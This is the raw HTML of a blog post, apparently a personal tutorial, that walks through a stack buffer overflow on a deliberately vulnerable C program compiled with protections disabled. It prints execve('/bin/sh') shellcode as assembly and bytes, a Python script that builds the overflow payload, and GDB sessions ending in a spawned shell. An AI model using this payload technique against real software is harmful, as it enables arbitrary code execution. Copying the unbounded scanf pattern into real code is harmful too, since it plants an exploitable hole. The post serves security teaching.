@@ -1,0 +1,414 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Executing Shellcode on Stack | Sanketh's Blog</title><meta name=keywords content="vulnerabilities,buffer overflow,reverse engineering"><meta name=description content='Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.
+Embedding Shellcode in a Buffer Overflow
+What is Shellcode?
+
+Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything.
+It is called “shellcode” not because it must open a shell, but because historically it did.
+
+2. Why embed shellcode on the stack?
+
+Sometimes you don’t know the address of any useful existing function.
+Or the binary doesn’t have functions like system("/bin/sh").
+In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point $rip register to the location of shellcode on stack so that CPU starts executing it.
+
+3. Requirements for embedding shellcode
+1. Executable stack
+
+The stack must have executable permissions.
+Many modern systems have NX (Non-Executable) protection → stack is not executable.
+CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since 80286 CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable.
+For learning, we usually compile with flags -z execstack which will make the stack executable.
+
+ gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln
+2. Enough space in the buffer
+
+Shellcode must fit entirely inside the buffer or adjacent space.
+
+3. No null bytes
+
+When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input.
+Shellcode must avoid 0x00, 0x0A, etc.
+
+Building the Payload
+To build the payload of overflowed string we need to consider various factors, let&rsquo;s understand it with a simple program:'><meta name=author content="Sanketh"><link rel=canonical href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.deee627d8b8d9065acc54b2c9d901e601e142335047d242a93ba7bce86f41f19.css integrity="sha256-3u5ifYuNkGWsxUssnZAeYB4UIzUEfSQqk7p7zob0Hxk=" rel="preload stylesheet" as=style><link rel=icon href=https://sankethbk.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sankethbk.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sankethbk.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://sankethbk.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://sankethbk.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack/"><meta property="og:site_name" content="Sanketh's Blog"><meta property="og:title" content="Executing Shellcode on Stack"><meta property="og:description" content='Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.
+Embedding Shellcode in a Buffer Overflow What is Shellcode? Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything. It is called “shellcode” not because it must open a shell, but because historically it did. 2. Why embed shellcode on the stack? Sometimes you don’t know the address of any useful existing function. Or the binary doesn’t have functions like system("/bin/sh"). In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point $rip register to the location of shellcode on stack so that CPU starts executing it. 3. Requirements for embedding shellcode 1. Executable stack The stack must have executable permissions. Many modern systems have NX (Non-Executable) protection → stack is not executable. CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since 80286 CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable. For learning, we usually compile with flags -z execstack which will make the stack executable. gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln 2. Enough space in the buffer Shellcode must fit entirely inside the buffer or adjacent space. 3. No null bytes When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input. Shellcode must avoid 0x00, 0x0A, etc. Building the Payload To build the payload of overflowed string we need to consider various factors, let’s understand it with a simple program:'><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-12-01T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-01T00:00:00+00:00"><meta property="article:tag" content="Vulnerabilities"><meta property="article:tag" content="Buffer Overflow"><meta property="article:tag" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Executing Shellcode on Stack"><meta name=twitter:description content='Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.
+Embedding Shellcode in a Buffer Overflow
+What is Shellcode?
+
+Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything.
+It is called “shellcode” not because it must open a shell, but because historically it did.
+
+2. Why embed shellcode on the stack?
+
+Sometimes you don’t know the address of any useful existing function.
+Or the binary doesn’t have functions like system("/bin/sh").
+In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point $rip register to the location of shellcode on stack so that CPU starts executing it.
+
+3. Requirements for embedding shellcode
+1. Executable stack
+
+The stack must have executable permissions.
+Many modern systems have NX (Non-Executable) protection → stack is not executable.
+CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since 80286 CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable.
+For learning, we usually compile with flags -z execstack which will make the stack executable.
+
+ gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln
+2. Enough space in the buffer
+
+Shellcode must fit entirely inside the buffer or adjacent space.
+
+3. No null bytes
+
+When injecting shellcode via string functions like gets, scanf("%s"), strcpy, a null byte will terminate input.
+Shellcode must avoid 0x00, 0x0A, etc.
+
+Building the Payload
+To build the payload of overflowed string we need to consider various factors, let&rsquo;s understand it with a simple program:'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://sankethbk.github.io/blog/posts/"},{"@type":"ListItem","position":2,"name":"Executing Shellcode on Stack","item":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Executing Shellcode on Stack","name":"Executing Shellcode on Stack","description":"Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.\nEmbedding Shellcode in a Buffer Overflow What is Shellcode? Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything. It is called “shellcode” not because it must open a shell, but because historically it did. 2. Why embed shellcode on the stack? Sometimes you don’t know the address of any useful existing function. Or the binary doesn’t have functions like system(\u0026quot;/bin/sh\u0026quot;). In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point $rip register to the location of shellcode on stack so that CPU starts executing it. 3. Requirements for embedding shellcode 1. Executable stack The stack must have executable permissions. Many modern systems have NX (Non-Executable) protection → stack is not executable. CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since 80286 CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable. For learning, we usually compile with flags -z execstack which will make the stack executable. gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln 2. Enough space in the buffer Shellcode must fit entirely inside the buffer or adjacent space. 3. No null bytes When injecting shellcode via string functions like gets, scanf(\u0026quot;%s\u0026quot;), strcpy, a null byte will terminate input. Shellcode must avoid 0x00, 0x0A, etc. Building the Payload To build the payload of overflowed string we need to consider various factors, let\u0026rsquo;s understand it with a simple program:\n","keywords":["vulnerabilities","buffer overflow","reverse engineering"],"articleBody":"Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.\nEmbedding Shellcode in a Buffer Overflow What is Shellcode? Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything. It is called “shellcode” not because it must open a shell, but because historically it did. 2. Why embed shellcode on the stack? Sometimes you don’t know the address of any useful existing function. Or the binary doesn’t have functions like system(\"/bin/sh\"). In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point $rip register to the location of shellcode on stack so that CPU starts executing it. 3. Requirements for embedding shellcode 1. Executable stack The stack must have executable permissions. Many modern systems have NX (Non-Executable) protection → stack is not executable. CPU provides setting read, write and executable permissions at individual page level which is enforced at hardware level. This feature has been there since 80286 CPU. Executing shellcode on stack will be impossible just by marking stack pages as non-executable. For learning, we usually compile with flags -z execstack which will make the stack executable. gcc -fno-pie -no-pie -fno-stack-protector -z execstack main.c -o vuln 2. Enough space in the buffer Shellcode must fit entirely inside the buffer or adjacent space. 3. No null bytes When injecting shellcode via string functions like gets, scanf(\"%s\"), strcpy, a null byte will terminate input. Shellcode must avoid 0x00, 0x0A, etc. Building the Payload To build the payload of overflowed string we need to consider various factors, let’s understand it with a simple program:\n#include void func() { char buffer[128]; scanf(\"%s\", buffer); printf(\"buffer is %s\\n\", buffer); } int main() { func(); } This code contains the buffer overflow vulnerability as scanf doesn’t perform any bounds check while copying the input to buffer variable on stack.\nIn order to do something useful with the overflowed payload, we need to build inject machine code for a valid program that will be executed. A common goal during such attacks is to spawn a shell (advanced versions include getting root shell and reverse shells).\nThis is the code to spawn a shell in C\n#include void main() { char *name[2]; name[0] = \"/bin/sh\"; name[1] = NULL; execve(name[0], name, NULL); } To see what the compiled code looks like, let’s compile it with -static flag, otherwise GCC will dynamically link the definition of execve which will be hard to extract.\n$ gcc -o shellcode -ggdb -static shellcode.c shellcode.c: In function ‘main’: shellcode.c:7:5: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration] 7 | execve(name[0], name, NULL); | ^~~~~~ (gdb) disassemble main Dump of assembler code for function main: 0x0000000000401865 \u003c+0\u003e:\tendbr64 0x0000000000401869 \u003c+4\u003e:\tpush rbp 0x000000000040186a \u003c+5\u003e:\tmov rbp,rsp 0x000000000040186d \u003c+8\u003e:\tsub rsp,0x20 0x0000000000401871 \u003c+12\u003e:\tmov rax,QWORD PTR fs:0x28 0x000000000040187a \u003c+21\u003e:\tmov QWORD PTR [rbp-0x8],rax 0x000000000040187e \u003c+25\u003e:\txor eax,eax 0x0000000000401880 \u003c+27\u003e:\tlea rax,[rip+0x7d789] # 0x47f010 0x0000000000401887 \u003c+34\u003e:\tmov QWORD PTR [rbp-0x20],rax 0x000000000040188b \u003c+38\u003e:\tmov QWORD PTR [rbp-0x18],0x0 0x0000000000401893 \u003c+46\u003e:\tmov rax,QWORD PTR [rbp-0x20] 0x0000000000401897 \u003c+50\u003e:\tlea rcx,[rbp-0x20] 0x000000000040189b \u003c+54\u003e:\tmov edx,0x0 0x00000000004018a0 \u003c+59\u003e:\tmov rsi,rcx 0x00000000004018a3 \u003c+62\u003e:\tmov rdi,rax 0x00000000004018a6 \u003c+65\u003e:\tcall 0x4112e0 0x00000000004018ab \u003c+70\u003e:\tnop 0x00000000004018ac \u003c+71\u003e:\tmov rax,QWORD PTR [rbp-0x8] 0x00000000004018b0 \u003c+75\u003e:\tsub rax,QWORD PTR fs:0x28 0x00000000004018b9 \u003c+84\u003e:\tje 0x4018c0 0x00000000004018bb \u003c+86\u003e:\tcall 0x412470 \u003c__stack_chk_fail_local\u003e 0x00000000004018c0 \u003c+91\u003e:\tleave 0x00000000004018c1 \u003c+92\u003e:\tret (gdb) disassemble __execve Dump of assembler code for function execve: 0x00000000004112e0 \u003c+0\u003e:\tendbr64 0x00000000004112e4 \u003c+4\u003e:\tmov eax,0x3b 0x00000000004112e9 \u003c+9\u003e:\tsyscall 0x00000000004112eb \u003c+11\u003e:\tcmp rax,0xfffffffffffff001 0x00000000004112f1 \u003c+17\u003e:\tjae 0x4112f4 0x00000000004112f3 \u003c+19\u003e:\tret 0x00000000004112f4 \u003c+20\u003e:\tmov rcx,0xffffffffffffffc0 0x00000000004112fb \u003c+27\u003e:\tneg eax 0x00000000004112fd \u003c+29\u003e:\tmov DWORD PTR fs:[rcx],eax 0x0000000000411300 \u003c+32\u003e:\tor rax,0xffffffffffffffff 0x0000000000411304 \u003c+36\u003e:\tret We have 2 options, we can write the definition of execve using syscall instruction in our shellcode or call it with call instruction. Former is preferred because otherwise we have to predict the address of execve once the program is loaded.\nThis is how execve is defined:\nint execve(const char *pathname, char *const argv[], char *const envp[]); execve shellcode = 1. Put \"/bin/sh\" somewhere in memory 2. Set RDI = pointer to \"/bin/sh\" (pathname) 3. Set RSI = pointer to [pointer_to_/bin/sh, NULL] (argv) 4. Set RDX = NULL (envp) 5. Set RAX = 0x3b (syscall number 59) 6. Execute syscall instruction Based on this, we can extract only the required instructions for calling execve\n; execve(\"/bin/sh\", [\"/bin/sh\", NULL], NULL) section .text global _start _start: ; Push \"/bin/sh\" onto stack (backwards because x86 is little-endian) xor rdx, rdx ; rdx = 0 (envp = NULL) push rdx ; Push null terminator ; Push \"/bin/sh\" (8 bytes) - we use \"//bin/sh\" to make it 8 bytes mov rax, 0x68732f6e69622f2f ; \"//bin/sh\" in hex (reversed) push rax ; Now stack has: [null][//bin/sh] mov rdi, rsp ; rdi = pointer to \"//bin/sh\" ; Build argv array on stack push rdx ; Push NULL (argv[1]) push rdi ; Push pointer to \"//bin/sh\" (argv[0]) mov rsi, rsp ; rsi = pointer to argv array ; Make the syscall mov al, 0x3b ; syscall number 59 (execve) syscall ; Execute! Passing //bin/sh is fine here because on Unix-like systems (including Linux), multiple leading slashes are treated like a single slash for normal paths.\n$ nasm -f elf64 shellcode.asm -o shellcode.o $ objdump -d shellcode.o shellcode.o: file format elf64-x86-64 Disassembly of section .text: 0000000000000000 \u003c_start\u003e: 0:\t48 31 d2 xor %rdx,%rdx 3:\t52 push %rdx 4:\t48 b8 2f 2f 62 69 6e movabs $0x68732f6e69622f2f,%rax b:\t2f 73 68 e:\t50 push %rax f:\t48 89 e7 mov %rsp,%rdi 12:\t52 push %rdx 13:\t57 push %rdi 14:\t48 89 e6 mov %rsp,%rsi 17:\tb0 3b mov $0x3b,%al 19:\t0f 05 syscall That makes the shellcode\nshellcode = ( b\"\\x48\\x31\\xd2\" # xor rdx,rdx b\"\\x52\" # push rdx b\"\\x48\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\" # mov rax, \"//bin/sh\" b\"\\x50\" # push rax b\"\\x48\\x89\\xe7\" # mov rdi,rsp b\"\\x52\" # push rdx b\"\\x57\" # push rdi b\"\\x48\\x89\\xe6\" # mov rsi,rsp b\"\\xb0\\x3b\" # mov al,0x3b b\"\\x0f\\x05\" # syscall ) Let’s run the program and inspect some of the addresses\n$ gdb -q vuln Reading symbols from vuln... (gdb) disass func Dump of assembler code for function func: 0x0000000000401156 \u003c+0\u003e:\tendbr64 0x000000000040115a \u003c+4\u003e:\tpush rbp 0x000000000040115b \u003c+5\u003e:\tmov rbp,rsp 0x000000000040115e \u003c+8\u003e:\tadd rsp,0xffffffffffffff80 0x0000000000401162 \u003c+12\u003e:\tlea rax,[rbp-0x80] 0x0000000000401166 \u003c+16\u003e:\tmov rsi,rax 0x0000000000401169 \u003c+19\u003e:\tlea rax,[rip+0xe94] # 0x402004 0x0000000000401170 \u003c+26\u003e:\tmov rdi,rax 0x0000000000401173 \u003c+29\u003e:\tmov eax,0x0 0x0000000000401178 \u003c+34\u003e:\tcall 0x401060 \u003c__isoc99_scanf@plt\u003e 0x000000000040117d \u003c+39\u003e:\tlea rax,[rbp-0x80] 0x0000000000401181 \u003c+43\u003e:\tmov rsi,rax 0x0000000000401184 \u003c+46\u003e:\tlea rax,[rip+0xe7c] # 0x402007 0x000000000040118b \u003c+53\u003e:\tmov rdi,rax 0x000000000040118e \u003c+56\u003e:\tmov eax,0x0 0x0000000000401193 \u003c+61\u003e:\tcall 0x401050 0x0000000000401198 \u003c+66\u003e:\tnop 0x0000000000401199 \u003c+67\u003e:\tleave 0x000000000040119a \u003c+68\u003e:\tret End of assembler dump. (gdb) b *0x0000000000401178 Breakpoint 1 at 0x401178: file main.c, line 7. (gdb) b *0x000000000040119a Breakpoint 2 at 0x40119a: file main.c, line 10. I have placed 2 breakpoints, one just before the buffe roverflow happens, another just before the function returns\nBreakpoint 1, 0x0000000000401178 in func () at main.c:7 7\tscanf(\"%s\", buffer); (gdb) p $rbp $1 = (void *) 0x7fffffffde50 (gdb) p \u0026buffer $2 = (char (*)[128]) 0x7fffffffddd0 (gdb) x/25bx \u0026buffer 0x7fffffffddd0:\t0x00\t0x80\t0x00\t0x00\t0x00\t0x00\t0x00\t0x00 0x7fffffffddd8:\t0x00\t0x00\t0x60\t0x00\t0x00\t0x00\t0x00\t0x00 0x7fffffffdde0:\t0x00\t0x00\t0x60\t0x00\t0x00\t0x00\t0x00\t0x00 0x7fffffffdde8:\t0x00 We can see the address of buffer is at 0x7fffffffddd0 which is where we are going to place the shellcode.\nWe can write a python script to build and format the shellcode\n#!/usr/bin/env python3 import sys shellcode = b\"\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\xb0\\x3b\\x0f\\x05\" payload = shellcode payload += b\"A\" * (128 - len(shellcode)) # exact padding payload += b\"BBBBBBBB\" # saved RBP (junk) payload += (0x7fffffffddd0).to_bytes(8, \"little\") # return into shellcode sys.stdout.buffer.write(payload) Since GDB disables ASLR, the address of buffer is going to remain same, so i had restarted the program in GDB using\n(gdb) run \u003c payload.bin Now we can verify the shellcode is overwritten properly at the address of the buffer\n(gdb) c Continuing. buffer is H1�RH�//bin/shPH��RWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB����� Breakpoint 2, 0x000000000040119a in func () at main.c:10 10\t} (gdb) x/25bx \u0026buffer 0x7fffffffddd0:\t0x48\t0x31\t0xd2\t0x52\t0x48\t0xb8\t0x2f\t0x2f 0x7fffffffddd8:\t0x62\t0x69\t0x6e\t0x2f\t0x73\t0x68\t0x50\t0x48 0x7fffffffdde0:\t0x89\t0xe7\t0x52\t0x57\t0x48\t0x89\t0xe6\t0xb0 0x7fffffffdde8:\t0x3b (gdb) x/25ib \u0026buffer 0x7fffffffddd0:\txor rdx,rdx 0x7fffffffddd3:\tpush rdx 0x7fffffffddd4:\tmovabs rax,0x68732f6e69622f2f 0x7fffffffddde:\tpush rax 0x7fffffffdddf:\tmov rdi,rsp 0x7fffffffdde2:\tpush rdx 0x7fffffffdde3:\tpush rdi 0x7fffffffdde4:\tmov rsi,rsp 0x7fffffffdde7:\tmov al,0x3b 0x7fffffffdde9:\tsyscall 0x7fffffffddeb:\trex.B 0x7fffffffddec:\trex.B 0x7fffffffdded:\trex.B 0x7fffffffddee:\trex.B 0x7fffffffddef:\trex.B 0x7fffffffddf0:\trex.B 0x7fffffffddf1:\trex.B 0x7fffffffddf2:\trex.B 0x7fffffffddf3:\trex.B 0x7fffffffddf4:\trex.B 0x7fffffffddf5:\trex.B 0x7fffffffddf6:\trex.B 0x7fffffffddf7:\trex.B 0x7fffffffddf8:\trex.B 0x7fffffffddf9:\trex.B We can see the $rip has actually started executing the shellcode\nBreakpoint 2, 0x000000000040119a in func () at main.c:10 10\t} (gdb) ni 0x00007fffffffddd0 in ?? () (gdb) x/25ib $rip =\u003e 0x7fffffffddd0:\txor rdx,rdx 0x7fffffffddd3:\tpush rdx 0x7fffffffddd4:\tmovabs rax,0x68732f6e69622f2f 0x7fffffffddde:\tpush rax 0x7fffffffdddf:\tmov rdi,rsp 0x7fffffffdde2:\tpush rdx 0x7fffffffdde3:\tpush rdi 0x7fffffffdde4:\tmov rsi,rsp 0x7fffffffdde7:\tmov al,0x3b 0x7fffffffdde9:\tsyscall 0x7fffffffddeb:\trex.B 0x7fffffffddec:\trex.B 0x7fffffffdded:\trex.B 0x7fffffffddee:\trex.B 0x7fffffffddef:\trex.B 0x7fffffffddf0:\trex.B 0x7fffffffddf1:\trex.B 0x7fffffffddf2:\trex.B 0x7fffffffddf3:\trex.B 0x7fffffffddf4:\trex.B 0x7fffffffddf5:\trex.B 0x7fffffffddf6:\trex.B 0x7fffffffddf7:\trex.B 0x7fffffffddf8:\trex.B 0x7fffffffddf9:\trex.B This actually resulted in a weird behaviour where GDB jumps from 0x00007fffffffdde3 to 0x00007fffffffddeb directly, showing syscall was possibly skipped. But the value of $rax being -38 shows its a valid error code, ENOSYS (Function not implemented).\n0x00007fffffffddd4 in ?? () (gdb) ni 0x00007fffffffddde in ?? () (gdb) p $rax $9 = 7526411553527181103 (gdb) ni Warning: Cannot insert breakpoint 0. Cannot access memory at address 0x68732f6e69622f2f 0x00007fffffffdddf in ?? () (gdb) p $rax $10 = 7526411553527181103 (gdb) ni 0x00007fffffffdde2 in ?? () (gdb) ni Warning: Cannot insert breakpoint 0. Cannot access memory at address 0x0 0x00007fffffffdde3 in ?? () (gdb) ni Program received signal SIGSEGV, Segmentation fault. 0x00007fffffffddeb in ?? () (gdb) p $rsi $11 = 140737488346688 (gdb) p $rdi $12 = 140737488346704 (gdb) p $rdx $13 = 0 (gdb) ni Program terminated with signal SIGSEGV, Segmentation fault. The program no longer exists. It turns out we are not passing the actual syscall number 58 in $rax.\n0x7fffffffddd4: movabs rax,0x68732f6e69622f2f ← RAX gets \"//bin/sh\" 0x7fffffffddde: push rax 0x7fffffffdddf: mov rdi,rsp 0x7fffffffdde2: push rdx 0x7fffffffdde3: push rdi 0x7fffffffdde4: mov rsi,rsp 0x7fffffffdde7: mov al,0x3b ← Only sets AL (low byte), not full RAX! 0x7fffffffdde9: syscall Instead now we use\nmov rax, 59 # Just set the whole register directly This shows the exploit worked\n(gdb) x/25ib 0x7fffffffddd0 0x7fffffffddd0:\txor rdx,rdx 0x7fffffffddd3:\tpush rdx 0x7fffffffddd4:\tmovabs rbx,0x68732f6e69622f2f 0x7fffffffddde:\tpush rbx 0x7fffffffdddf:\tmov rdi,rsp 0x7fffffffdde2:\tpush rdx 0x7fffffffdde3:\tpush rdi 0x7fffffffdde4:\tmov rsi,rsp 0x7fffffffdde7:\tmov rax,0x3b 0x7fffffffddee:\tsyscall 0x7fffffffddf0:\trex.B 0x7fffffffddf1:\trex.B 0x7fffffffddf2:\trex.B 0x7fffffffddf3:\trex.B 0x7fffffffddf4:\trex.B 0x7fffffffddf5:\trex.B 0x7fffffffddf6:\trex.B 0x7fffffffddf7:\trex.B 0x7fffffffddf8:\trex.B 0x7fffffffddf9:\trex.B 0x7fffffffddfa:\trex.B 0x7fffffffddfb:\trex.B 0x7fffffffddfc:\trex.B 0x7fffffffddfd:\trex.B 0x7fffffffddfe:\trex.B (gdb) c Continuing. process 4012 is executing new program: /usr/bin/dash Warning: Cannot insert breakpoint 1. Cannot access memory at address 0x401178 Cannot insert breakpoint 2. Cannot access memory at address 0x40119a Outside of GDB\n$ ./vuln \u003c payload.bin buffer is at 0x7fffffffded0 buffer is H1�RH�//bin/shSH��RWH��H��; $ ./vuln \u003c payload.bin buffer is at 0x7fffffffded0 buffer is H1�RH�//bin/shSH��RWH��H��; $ (cat payload.bin; cat) | ./vuln buffer is at 0x7fffffffded0 ls buffer is H1�RH�//bin/shSH��RWH��H��; ls a.out main.c payload.bin payload.py\tpayload2.py payload3.py shellcode shellcode.asm shellcode.c shellcode.o trace.txt vuln ls a.out main.c payload.bin payload.py\tpayload2.py payload3.py shellcode shellcode.asm shellcode.c shellcode.o trace.txt vuln pwd /home/sanketh/assembly/vuln/buffer_overflow/stack_based_buffer_overflow/smashing_stack_for_fun_and_profit/exploit3 whoami sanketh ","wordCount":"1921","inLanguage":"en","datePublished":"2025-12-01T00:00:00Z","dateModified":"2025-12-01T00:00:00Z","author":{"@type":"Person","name":"Sanketh"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack/"},"publisher":{"@type":"Organization","name":"Sanketh's Blog","logo":{"@type":"ImageObject","url":"https://sankethbk.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sankethbk.github.io/blog/ accesskey=h title="Sanketh's Blog (Alt + H)">Sanketh's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
+<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
+<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Executing Shellcode on Stack</h1><div class=post-meta><span title='2025-12-01 00:00:00 +0000 UTC'>December 1, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;Sanketh&nbsp;|&nbsp;<a href=https://github.com/SankethBK/blog/edit/main/content/posts/reverse-engineering/vulnerabilities/2025-11-30-executing-shellcode-on-stack.markdown rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#embedding-shellcode-in-a-buffer-overflow aria-label="Embedding Shellcode in a Buffer Overflow">Embedding Shellcode in a Buffer Overflow</a><ul><li><a href=#what-is-shellcode aria-label="What is Shellcode?">What is Shellcode?</a></li><li><a href=#2-why-embed-shellcode-on-the-stack aria-label="2. Why embed shellcode on the stack?">2. Why embed shellcode on the stack?</a></li><li><a href=#3-requirements-for-embedding-shellcode aria-label="3. Requirements for embedding shellcode">3. Requirements for embedding shellcode</a><ul><li><a href=#1-executable-stack aria-label="1. Executable stack">1. Executable stack</a></li><li><a href=#2-enough-space-in-the-buffer aria-label="2. Enough space in the buffer">2. Enough space in the buffer</a></li><li><a href=#3-no-null-bytes aria-label="3. No null bytes">3. No null bytes</a></li></ul></li><li><a href=#building-the-payload aria-label="Building the Payload">Building the Payload</a></li></ul></li></ul></div></details></div><div class=post-content><p>Previously we saw how to overwrite the return address of stack by passing extra bytes to an unbounded buffer. But not everytime we will have a convinient function address to overwrite. The next attempt is to place the code we want to execute directly on the stack itself.</p><h1 id=embedding-shellcode-in-a-buffer-overflow>Embedding Shellcode in a Buffer Overflow<a hidden class=anchor aria-hidden=true href=#embedding-shellcode-in-a-buffer-overflow>#</a></h1><h2 id=what-is-shellcode>What is Shellcode?<a hidden class=anchor aria-hidden=true href=#what-is-shellcode>#</a></h2><ul><li>Shellcode is machine instructions (usually written in assembly) that perform some action — often spawning a shell (/bin/sh), but can be anything.</li><li>It is called “shellcode” not because it must open a shell, but because historically it did.</li></ul><h2 id=2-why-embed-shellcode-on-the-stack>2. Why embed shellcode on the stack?<a hidden class=anchor aria-hidden=true href=#2-why-embed-shellcode-on-the-stack>#</a></h2><ul><li>Sometimes you don’t know the address of any useful existing function.</li><li>Or the binary doesn’t have functions like system("/bin/sh").</li><li>In these cases, the attacker places their own code (shellcode) inside the same buffer that overflows. Then somehow point <code>$rip</code> register to the location of shellcode on stack so that CPU starts executing it.</li></ul><h2 id=3-requirements-for-embedding-shellcode>3. Requirements for embedding shellcode<a hidden class=anchor aria-hidden=true href=#3-requirements-for-embedding-shellcode>#</a></h2><h3 id=1-executable-stack>1. Executable stack<a hidden class=anchor 